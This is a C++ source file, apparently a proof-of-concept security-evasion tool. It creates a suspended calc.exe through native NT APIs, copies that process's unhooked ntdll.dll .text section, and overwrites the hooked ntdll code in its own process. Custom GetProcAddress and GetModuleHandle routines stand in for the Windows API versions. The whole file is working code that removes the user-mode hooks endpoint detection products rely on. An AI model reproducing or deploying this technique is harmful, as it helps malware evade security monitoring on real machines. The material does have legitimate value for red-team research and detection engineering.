#include <windows.h>
#include <iostream>
#define PS_ATTRIBUTE_IMAGE_NAME 0x20005

typedef enum   _PROCESSINFOCLASS { ProcessBasicInformation = 0 } PROCESSINFOCLASS;
typedef enum   _PS_CREATE_STATE { PsCreateInitialState, PsCreateFailOnFileOpen, PsCreateFailOnSectionCreate, PsCreateFailExeFormat, PsCreateFailMachineMismatch, PsCreateFailExeName, PsCreateSuccess, PsCreateMaximumStates } PS_CREATE_STATE;
typedef struct _PS_ATTRIBUTE { ULONG_PTR Attribute; SIZE_T Size; union { ULONG_PTR Value; PVOID ValuePtr; }; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE;
typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[2]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
typedef struct _PS_CREATE_INFO { SIZE_T Size; PS_CREATE_STATE State; union { struct { union { ULONG InitFlags; struct { UCHAR WriteOutputOnExit : 1, DetectManifest : 1, IFEOSkipDebugger : 1, IFEODoNotPropagateKeyState : 1, SpareBits1 : 4, SpareBits2 : 8; USHORT ProhibitedImageCharacteristics : 16; } s1; } u1; ACCESS_MASK AdditionalFileAccess; } InitState; struct { HANDLE FileHandle; } FailSection; struct { USHORT DllCharacteristics; } ExeFormat; struct { HANDLE IFEOKey; } ExeName; struct { union { ULONG OutputFlags; struct { UCHAR ProtectedProcess : 1, AddressSpaceOverride : 1, DevOverrideEnabled : 1, ManifestDetected : 1, ProtectedProcessLight : 1, SpareBits1 : 3, SpareBits2 : 8; USHORT SpareBits3 : 16; } s2; } u2; HANDLE FileHandle, SectionHandle; ULONGLONG UserProcessParametersNative; ULONG UserProcessParametersWow64, CurrentParameterFlags; ULONGLONG PebAddressNative; ULONG PebAddressWow64; ULONGLONG ManifestAddress; ULONG ManifestSize; } SuccessState; }; } PS_CREATE_INFO, * PPS_CREATE_INFO;
typedef struct _UNICODE_STRING { USHORT Length, MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor, SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _RTL_DRIVE_LETTER_CURDIR { USHORT Flags, Length; ULONG TimeStamp; UNICODE_STRING DosPath; } RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;
typedef struct _RTL_USER_PROCESS_PARAMETERS { ULONG MaximumLength, Length, Flags, DebugFlags; HANDLE ConsoleHandle, StandardInput, StandardOutput, StandardError, CurrentDirectoryHandle; ULONG ConsoleFlags, StartingX, StartingY, CountX, CountY, CountCharsX, CountCharsY, FillAttribute, WindowFlags, ShowWindowFlags, EnvironmentSize; UNICODE_STRING CurrentDirectoryPath, DllPath, ImagePathName, CommandLine, WindowTitle, DesktopInfo, ShellInfo, RuntimeData; PVOID Environment; RTL_DRIVE_LETTER_CURDIR CurrentDirectories[32]; } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
typedef struct _STRING { USHORT Length; USHORT MaximumLength; PCHAR Buffer; } ANSI_STRING, * PANSI_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE);
typedef NTSTATUS(WINAPI* NtCreateUserProcessFn)(PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes, POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS ProcessParameters, PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST AttributeList);
typedef NTSTATUS(WINAPI* NtProtectVirtualMemoryFn)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
typedef NTSTATUS(WINAPI* NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* NtTerminateProcessFn)(HANDLE ProcessHandle, int ExitStatus);
typedef PVOID(WINAPI* RtlAllocateHeapFn)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
typedef NTSTATUS(WINAPI* RtlCreateProcessParametersExFn)(PRTL_USER_PROCESS_PARAMETERS* pProcessParameters, PUNICODE_STRING ImagePathName, PUNICODE_STRING DllPath, PUNICODE_STRING CurrentDirectory, PUNICODE_STRING CommandLine, PVOID Environment, PUNICODE_STRING WindowTitle, PUNICODE_STRING DesktopInfo, PUNICODE_STRING ShellInfo, PUNICODE_STRING RuntimeData, ULONG Flags);
typedef VOID(WINAPI* RtlDestroyProcessParametersFn)(PRTL_USER_PROCESS_PARAMETERS ProcessParameters);
typedef VOID(WINAPI* RtlFreeHeapFn)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
typedef VOID(WINAPI* RtlInitUnicodeStringFn)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSTATUS(NTAPI* RtlUnicodeStringToAnsiStringFn)(PANSI_STRING DestinationString, PCUNICODE_STRING SourceString, BOOLEAN AllocateDestinationString);

NtCloseFn NtClose;
NtCreateUserProcessFn NtCreateUserProcess;
NtProtectVirtualMemoryFn NtProtectVirtualMemory;
NtQueryInformationProcessFn NtQueryInformationProcess;
NtReadVirtualMemoryFn NtReadVirtualMemory;
NtTerminateProcessFn NtTerminateProcess;
RtlAllocateHeapFn RtlAllocateHeap;
RtlCreateProcessParametersExFn RtlCreateProcessParametersEx;
RtlDestroyProcessParametersFn RtlDestroyProcessParameters;
RtlFreeHeapFn RtlFreeHeap;
RtlInitUnicodeStringFn RtlInitUnicodeString;
RtlUnicodeStringToAnsiStringFn RtlUnicodeStringToAnsiString;


// Print auxiliary function
void Log(const char* message, bool success) {
    bool debug = true;
    if (debug) {
        printf("[LOG] %-25.25s\t%s\n", message, success ? "OK" : "FAIL");
    }
}


// Read 8-bytes remotely: NtReadVirtualMemory
PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[8];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
        return NULL;
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


// Read remote 16-bytes address - NtReadVirtualMemory
uintptr_t ReadRemoteUintptr_t(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[16];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(uintptr_t), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteUintptr_t). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
        return 0;
    }

    uintptr_t value = *(uintptr_t*)buff;
    return value;
}


// Read Unicode string remotely: NtReadVirtualMemory + RtlUnicodeStringToAnsiString
char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    // Read Unicode string
    if (!hProcess || !mem_address) {
        return (char*)"";
    }
    BYTE buff[512] = { 0 };
    SIZE_T bytesRead = 0;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) { // if (ntstatus != 0) {
        printf("[-] NtReadVirtualMemory failed (0x%X) at 0x%p\n", ntstatus, mem_address);
        return (char*)"<unknown>";
    }
    if (bytesRead < 2) {
        return (char*)"<unknown>";
    }

    // Convert wide char to multi-byte
    static char output[256];
    UNICODE_STRING uniStr;
    ANSI_STRING ansiStr;
    uniStr.Length = (USHORT)wcsnlen((wchar_t*)buff, 256) * sizeof(wchar_t);
    uniStr.MaximumLength = uniStr.Length + sizeof(wchar_t);
    uniStr.Buffer = (wchar_t*)buff;
    ansiStr.Length = 0;
    ansiStr.MaximumLength = sizeof(output);
    ansiStr.Buffer = output;
    NTSTATUS status = RtlUnicodeStringToAnsiString(&ansiStr, &uniStr, FALSE);
    if (status == 0) {
        if (ansiStr.Length < sizeof(output)) {
            output[ansiStr.Length] = '\0';
        }
        else {
            output[sizeof(output) - 1] = '\0';
        }
    }
    return output;
}


// Custom implementation for GetProcessHeap - NtQueryInformationProcess + NtReadVirtualMemory
HANDLE CustomGetProcessHeap() {
    const int process_basic_information_size = 48;
    int peb_offset = 0x8;
    BYTE pbi_byte_array[process_basic_information_size];
    void* pbi_addr = (void*)pbi_byte_array;
    ULONG ReturnLength;
    NTSTATUS ntstatus = NtQueryInformationProcess((HANDLE)-1, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
    void* pebaddress = *(void**)peb_pointer;
    void* processHeapAddress = (void*)((uintptr_t)pebaddress + 0x30);
    HANDLE heapHandle = NULL;
    SIZE_T bytesRead;
    ntstatus = NtReadVirtualMemory((HANDLE)-1, processHeapAddress, &heapHandle, sizeof(heapHandle), &bytesRead);
    return (ntstatus == 0) ? heapHandle : NULL;
}


// Custom implementation for GetProcAddress - NtReadVirtualMemory
void* CustomGetProcAddress(void* pDosHdr, const char* func_name) {
    int exportrva_offset = 136;
    HANDLE hProcess = (HANDLE)-1;
    DWORD e_lfanew_value = 0;
    SIZE_T aux = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + 0x3C, &e_lfanew_value, sizeof(e_lfanew_value), &aux);
    WORD sizeopthdr_value = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + 20, &sizeopthdr_value, sizeof(sizeopthdr_value), &aux);
    DWORD exportTableRVA_value = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + exportrva_offset, &exportTableRVA_value, sizeof(exportTableRVA_value), &aux);
    if (exportTableRVA_value != 0) {
        DWORD numberOfNames_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x18, &numberOfNames_value, sizeof(numberOfNames_value), &aux);
        DWORD addressOfFunctionsVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x1C, &addressOfFunctionsVRA_value, sizeof(addressOfFunctionsVRA_value), &aux);
        DWORD addressOfNamesVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x20, &addressOfNamesVRA_value, sizeof(addressOfNamesVRA_value), &aux);
        DWORD addressOfNameOrdinalsVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x24, &addressOfNameOrdinalsVRA_value, sizeof(addressOfNameOrdinalsVRA_value), &aux);
        void* addressOfFunctionsRA = (BYTE*)pDosHdr + addressOfFunctionsVRA_value;
        void* addressOfNamesRA = (BYTE*)pDosHdr + addressOfNamesVRA_value;
        void* addressOfNameOrdinalsRA = (BYTE*)pDosHdr + addressOfNameOrdinalsVRA_value;
        for (int i = 0; i < numberOfNames_value; i++) {
            DWORD functionAddressVRA = 0;
            NtReadVirtualMemory(hProcess, addressOfNamesRA, &functionAddressVRA, sizeof(functionAddressVRA), &aux);
            void* functionAddressRA = (BYTE*)pDosHdr + functionAddressVRA;
            char functionName[256];
            NtReadVirtualMemory(hProcess, functionAddressRA, functionName, strlen(func_name) + 1, &aux);
            if (strcmp(functionName, func_name) == 0) {
                WORD ordinal = 0;
                NtReadVirtualMemory(hProcess, addressOfNameOrdinalsRA, &ordinal, sizeof(ordinal), &aux);
                void* functionAddress;
                NtReadVirtualMemory(hProcess, (BYTE*)addressOfFunctionsRA + ordinal * 4, &functionAddress, sizeof(functionAddress), &aux);
                uintptr_t maskedFunctionAddress = (uintptr_t)functionAddress & 0xFFFFFFFF;
                return (BYTE*)pDosHdr + (DWORD_PTR)maskedFunctionAddress;
            }
            addressOfNamesRA = (BYTE*)addressOfNamesRA + 4;
            addressOfNameOrdinalsRA = (BYTE*)addressOfNameOrdinalsRA + 2;
        }
    }
    return NULL;
}


// Custom implementation for GetModuleHandle
uintptr_t CustomGetModuleHandle(HANDLE hProcess, const char* dll_name) {
    int process_basic_information_size = 48;
    int peb_offset = 0x8;
    int ldr_offset = 0x18;
    int inInitializationOrderModuleList_offset = 0x30;
    int flink_dllbase_offset = 0x20;
    int flink_buffer_fulldllname_offset = 0x40;
    int flink_buffer_offset = 0x50;

    BYTE pbi_byte_array[48];
    void* pbi_addr = (void*)pbi_byte_array;
    ULONG ReturnLength;

    NTSTATUS ntstatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
    void* pebaddress = *(void**)peb_pointer;
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
    if ((long long)ldr_adress == 0) {
        printf("[-] PEB structure is not readable.\n");
        exit(0);
    }
    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

    uintptr_t dll_base = (uintptr_t)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);

        dll_base = (uintptr_t)ReadRemoteUintptr_t(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));

        void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(hProcess, buffer);

        if (strcmp(base_dll_name, dll_name) == 0) {
            return dll_base;
        }
        next_flink = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + 0x10));
    }

    return 0;
}


// Concatenate chars and return wchar_t*
wchar_t* get_concatenated_wchar_t(const char* str1, const char* str2, bool add_space) {
    size_t len1 = strlen(str1);
    size_t len2 = strlen(str2);
    size_t total_len = len1 + len2 + 1;
    if (add_space) {
        total_len += 1;
    }
    wchar_t* result = (wchar_t*)malloc(total_len * sizeof(wchar_t));
    if (!result) return NULL;
    for (size_t i = 0; i < len1; i++) {
        result[i] = (wchar_t)(unsigned char)str1[i];
    }
    if (add_space) {
        result[len1] = L' ';
    }
    for (size_t i = 0; i < len2; i++) {
        if (add_space) {
            result[len1 + 1 + i] = (wchar_t)(unsigned char)str2[i];
        }
        else {
            result[len1 + i] = (wchar_t)(unsigned char)str2[i];
        }
    }
    result[total_len - 1] = L'\0';
    return result;
}


// Create process: RtlCreateProcessParametersEx + NtCreateUserProcess
HANDLE CreateSuspProc(char* process_path) {
    // Create process parameters
    UNICODE_STRING NtImagePath;
    RtlInitUnicodeString(&NtImagePath, get_concatenated_wchar_t("\\??\\", process_path, false));
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
    NTSTATUS ntstatus = RtlCreateProcessParametersEx(
        &ProcessParameters,
        &NtImagePath,
        NULL,
        NULL,
        NULL, // &Params,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        1
    );
    if (ntstatus != 0) {
        Log("RtlCreateProcessParametersEx", false);
        return NULL;
    }
    Log("RtlCreateProcessParametersEx", true);

    // Create the process
    PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;
    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(
        CustomGetProcessHeap(),
        HEAP_ZERO_MEMORY,
        sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE) * 1);
    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList->Attributes[0].Size = NtImagePath.Length;
    AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;
    HANDLE hProcess = NULL, hThread = NULL;
    ULONG threadFlags = 0x00000001;
    ntstatus = NtCreateUserProcess(
        &hProcess,
        &hThread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        threadFlags,
        ProcessParameters,
        &CreateInfo,
        AttributeList
    );
    if (ntstatus != 0) {
        Log("NtCreateUserProcess", false);
        RtlFreeHeap(CustomGetProcessHeap(), 0, AttributeList);
        RtlDestroyProcessParameters(ProcessParameters);
        return NULL;
    }
    Log("NtCreateUserProcess", true);

    // Clean up
    RtlFreeHeap(CustomGetProcessHeap(), 0, AttributeList);
    RtlDestroyProcessParameters(ProcessParameters);
    return hProcess;
}


// Get BaseOfCode and SizeOfCode
int* GetTextSectionInfo(LPVOID ntdll_address) {
    HANDLE hProcess = (HANDLE)-1;
    // Check MZ Signature (2 bytes)
    BYTE signature_dos_header[2];
    SIZE_T bytesRead;
    if ((NtReadVirtualMemory(hProcess, ntdll_address, signature_dos_header, 2, &bytesRead) != 0) || bytesRead != 2) {
        printf("[-] Error reading DOS header signature\n");
        exit(0);
    }

    if (signature_dos_header[0] != 'M' || signature_dos_header[1] != 'Z') {
        printf("[-] Incorrect DOS header signature\n");
        exit(0);
    }

    // Read e_lfanew (4 bytes) at offset 0x3C
    DWORD e_lfanew;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + 0x3C, &e_lfanew, 4, &bytesRead) != 0) || bytesRead != 4) {
        printf("[-] Error reading e_lfanew\n");
        exit(0);
    }

    // Check PE Signature (2 bytes)
    BYTE signature_nt_header[2];
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew, signature_nt_header, 2, &bytesRead) != 0) || bytesRead != 2) {
        printf("[-] Error reading NT header signature\n");
        exit(0);
    }

    if (signature_nt_header[0] != 'P' || signature_nt_header[1] != 'E') {
        printf("[-] Incorrect NT header signature\n");
        exit(0);
    }

    // Check Optional Headers Magic field value (2 bytes)
    WORD optional_header_magic;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24, &optional_header_magic, 2, &bytesRead) != 0) || bytesRead != 2) {
        printf("[-] Error reading Optional Header Magic\n");
        exit(0);
    }

    if (optional_header_magic != 0x20B && optional_header_magic != 0x10B) {
        printf("[-] Incorrect Optional Header Magic field value\n");
        exit(0);
    }

    // Read SizeOfCode (4 bytes)
    DWORD sizeofcode;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 4, &sizeofcode, 4, &bytesRead) != 0) || bytesRead != 4) {
        printf("[-] Error reading SizeOfCode\n");
        exit(0);
    }

    // Read BaseOfCode (4 bytes)
    DWORD baseofcode;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 20, &baseofcode, 4, &bytesRead) != 0) || bytesRead != 4) {
        printf("[-] Error reading BaseOfCode\n");
        exit(0);
    }

    // Return BaseOfCode and SizeOfCode as an array
    static int result[2];
    result[0] = baseofcode;
    result[1] = sizeofcode;

    return result;
}


LPVOID MapNtdllFromSuspendedProc(HANDLE hProcess) {
    HANDLE currentProcess = (HANDLE)(-1);
    uintptr_t localNtdllHandle = CustomGetModuleHandle(currentProcess, "ntdll.dll");
    int* result = GetTextSectionInfo((void*)localNtdllHandle);
    int localNtdllTxtBase = result[0];
    int localNtdllTxtSize = result[1];
    LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle + localNtdllTxtBase);
    BYTE* ntdllBuffer = (BYTE*)malloc(localNtdllTxtSize);
    SIZE_T bytesRead;
    NTSTATUS readprocmem_res = NtReadVirtualMemory(
        hProcess,
        localNtdllTxt,
        ntdllBuffer,
        localNtdllTxtSize,
        &bytesRead
    );
    if (readprocmem_res != 0) {
        printf("[-] Error calling NtReadVirtualMemory\n");
        exit(0);
    }
    LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer;
    NTSTATUS terminateproc_res = NtTerminateProcess(hProcess, 0);
    if (terminateproc_res != 0) {
        printf("[-] Error calling DebugActiveProcessStop or TerminateProcess\n");
        exit(0);
    }
    NTSTATUS closehandle_proc = NtClose(hProcess);
    if (closehandle_proc != 0) {
        printf("[-] Error calling NtClose\n");
        exit(0);
    }
    return pNtdllBuffer;
}


// Overwrite hooked ntdll .text section with a clean version
void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
    // Make memory writable
    ULONG dwOldProtection;
    HANDLE currentProcess = (HANDLE)(-1);
    SIZE_T aux = localNtdllTxtSize;
    NTSTATUS vp_res = NtProtectVirtualMemory(currentProcess, &localNtdllTxt, &aux, 0x80, &dwOldProtection);
    if (vp_res != 0) {
        printf("[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY)\n");
        return;
    }

    // Copy contents
    printf("[LOG] Press a key to overwrite the memory at 0x%llX with the contents from 0x%llX", localNtdllTxt, unhookedNtdllTxt); getchar();
    memcpy(localNtdllTxt, unhookedNtdllTxt, localNtdllTxtSize);
    printf("[LOG] Memory overwritten, press a key to finish"); getchar();

    // VirtualProtect back to the original protection
    NTSTATUS vp_res_2 = NtProtectVirtualMemory(currentProcess, &localNtdllTxt, &aux, dwOldProtection, &dwOldProtection);
    if (vp_res_2 != 0) {
        printf("[-] Error calling NtProtectVirtualMemory (dwOldProtection)\n");
        exit(0);
    }
}


void RemapNtdll(HANDLE hProcess) {
    const char* targetDll = "ntdll.dll";
    long long unhookedNtdllTxt = (long long)MapNtdllFromSuspendedProc(hProcess);
    HANDLE currentProcess = (HANDLE)(-1);
    uintptr_t localNtdllHandle = CustomGetModuleHandle(currentProcess, targetDll);
    int* textSectionInfo = GetTextSectionInfo((void*)localNtdllHandle);
    int localNtdllTxtBase = textSectionInfo[0];
    int localNtdllTxtSize = textSectionInfo[1];
    long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;
    ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
    Log("Library remap", true);
}


// Initialize functions - kernel32!LoadLibraryA (once) + kernel32!GetProcAddress (once)
void initializeFunctions() {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress((HMODULE)hNtdll, "NtReadVirtualMemory");
    NtQueryInformationProcess = (NtQueryInformationProcessFn)CustomGetProcAddress(hNtdll, "NtQueryInformationProcess");
    NtClose = (NtCloseFn)CustomGetProcAddress(hNtdll, "NtClose");
    NtCreateUserProcess = (NtCreateUserProcessFn)CustomGetProcAddress(hNtdll, "NtCreateUserProcess");
    RtlCreateProcessParametersEx = (RtlCreateProcessParametersExFn)CustomGetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
    RtlInitUnicodeString = (RtlInitUnicodeStringFn)CustomGetProcAddress(hNtdll, "RtlInitUnicodeString");
    RtlAllocateHeap = (RtlAllocateHeapFn)CustomGetProcAddress(hNtdll, "RtlAllocateHeap");
    RtlFreeHeap = (RtlFreeHeapFn)CustomGetProcAddress(hNtdll, "RtlFreeHeap");
    RtlDestroyProcessParameters = (RtlDestroyProcessParametersFn)CustomGetProcAddress(hNtdll, "RtlDestroyProcessParameters");
    RtlUnicodeStringToAnsiString = (RtlUnicodeStringToAnsiStringFn)CustomGetProcAddress(hNtdll, "RtlUnicodeStringToAnsiString");
    NtTerminateProcess = (NtTerminateProcessFn)CustomGetProcAddress(hNtdll, "NtTerminateProcess");
    NtProtectVirtualMemory = (NtProtectVirtualMemoryFn)CustomGetProcAddress(hNtdll, "NtProtectVirtualMemory");
    return;
}


int main(int argc, char* argv[]) {
    // Populate function addresses
    initializeFunctions();

    // Create suspended process
    char* process_to_create = (char*)"c:\\Windows\\System32\\calc.exe";
    HANDLE hProcess = CreateSuspProc(process_to_create);

    // Remap ntdll.dll library
    RemapNtdll(hProcess);

    // Close handle
    NtClose(hProcess);

    return 0;
}